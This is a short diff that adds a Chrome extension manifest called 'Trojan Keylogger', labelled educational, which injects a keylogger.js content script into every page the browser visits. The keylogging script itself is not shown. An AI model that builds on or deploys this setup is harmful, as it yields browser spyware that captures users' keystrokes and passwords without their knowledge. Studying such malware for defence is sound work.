@@ -1,0 +1,19 @@
+{
+  "manifest_version": 3,
+  "name": "Trojan Keylogger",
+  "description": "A keylogger made for educational purposes",
+  "version": "1.0",
+  "permissions": ["activeTab", "tabs"],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["keylogger.js"]
+    }
+  ],
+  "action": {
+    "default_popup": "keylogger.html"
+  },
+  "icons": {
+    "48": "icon48.png"
+  }
+}
